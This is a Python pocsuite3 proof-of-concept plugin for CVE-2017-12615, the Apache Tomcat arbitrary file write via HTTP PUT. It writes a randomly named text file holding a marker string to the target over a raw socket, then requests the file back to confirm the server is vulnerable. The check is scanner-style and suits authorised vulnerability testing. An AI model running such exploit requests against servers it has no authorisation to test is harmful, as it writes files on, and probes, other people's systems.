from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.lib.utils import random_str
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import socket
import time


class TestPOC(POCBase):
    vulID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615']
    name = 'Apache Tomcat PUT任意写文件漏洞'
    appPowerLink = ''
    appName = 'Apache Tomcat'
    appVersion = 'all'
    vulType = 'file-upload'
    # 漏洞描述
    desc = '''
通过PUT方法上传任意文件，可以达到任意代码执行的效果。
	'''
    samples = ['']
    install_requires = ['']
    cveID = 'CVE-2017-12615'
    severity = 'high'
    solution = ''''''
    taskType = 'app-vul'

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 8080)
        result = {}
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        file_name = random_str(10)
        flag = "PUT /%s.txt HTTP/1.1\r\nHost: %s:%d\r\n" % (file_name, ip, port) + "Content-Length: 9\r\n\r\nxxscan0\r\n\r\n"
        s.send(flag.encode())
        time.sleep(1)
        s.recv(1024)
        s.close()
        time.sleep(1)
        payload_url = make_verify_url(self.url, f"{file_name}.txt", mod=0)
        response = requests.get(payload_url, verify=False, timeout=15)
        if b'xxscan0' in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(TestPOC)
